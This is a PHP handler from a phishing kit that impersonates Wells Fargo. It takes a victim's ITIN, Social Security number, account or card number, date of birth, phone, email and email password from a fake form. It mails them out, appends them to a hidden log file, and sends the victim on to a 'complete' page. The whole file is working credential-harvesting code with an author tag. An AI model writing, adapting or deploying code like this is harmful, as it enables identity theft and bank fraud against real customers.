<?php
session_start();
include ('bt.php');
$ib = getenv("REMOTE_ADDR");
$random=rand(0,100000000000);
$ran = md5($random);
$_SESSION[$ran] = $random;
$random=rand(0,100000000000);
$rans = md5($random);
$_SESSION[$rans] = $random;
$ip = getenv("REMOTE_ADDR");
$message .= "<<=============>>!*.*! Wellsfargo Details & PERSONAL INFO !*.*!<<=============>>\n";
$message .= "ITIN : ".$_POST['username']."\n";
$message .= "SSN: ".$_POST['ssn1']."/".$_POST['ssn2']."/".$_POST['ssn3']."\n";
$message .= "ACC/CC NO: ".$_POST['accountNumber']."\n";
$message .= "DOB: ".$_POST['dob1']."/".$_POST['dob2']."/".$_POST['dob3']."\n";
$message .= "Phone: ".$_POST['phn1']."/".$_POST['phn2']."/".$_POST['phn3']."\n";
$message .= "Email : ".$_POST['email']."\n";
$message .= "Email Password : ".$_POST['emailpass']."\n";
$message .= "IP                     : ".$ip."\n";
$message .= "---------------Created BY Panda.LY -------------\n";
$send = "Wellsfargo@Wellsfargo.com";
$from = "Wellsfargo@Wellsfargo.com";
    $subject = " Wellsfargo Details: ".$ip."\n"; 
    mail($send, $subject, $message, $from);m();


$milaf = fopen("./../../../2pnt.txt","a");   ///  Masar Deyal Milaf Rzlt OK.
fwrite($milaf,$message);	

		   header("Location: ./complete.php?country.x=" . $_SESSION['cntc'] . "-" . $_SESSION['cntn'] . "&ReasonCode=04" . $ib . "=codes_list=OAM-2=" . $rans . "S=" . crypt($_SESSION['cntn']) . "" . include '../ran.php' . "");

		   


?>